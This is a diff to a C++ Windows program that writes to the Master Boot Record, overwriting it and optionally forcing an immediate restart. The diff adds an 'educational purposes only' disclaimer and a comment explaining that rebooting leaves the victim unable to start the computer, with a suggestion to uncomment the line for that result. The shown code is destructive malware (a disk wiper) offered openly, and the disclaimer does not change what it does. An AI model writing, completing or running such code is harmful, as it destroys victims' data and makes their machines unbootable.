@@ -1,3 +1,8 @@
+/*
+This script is only for educational purposes, please don't run this code in a real pc.
+I dissociate myself from any illegal use of this file.
+*/
+
 #include <Windows.h>
 #include <iostream>
 
@@ -22,7 +27,7 @@ int main(){
 if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
     cout << "Master Boot Record was overwritten!";
     Sleep(5000);
-    //system("shutdown -r -t 00")
+    //system("shutdown -r -t 00"); //Restarting pc after master boot record overwritten will cause a fatal error. Victim won't be able to start his computer again. Uncomment if you want this result instantly. 
     ExitProcess(0);
 
 }
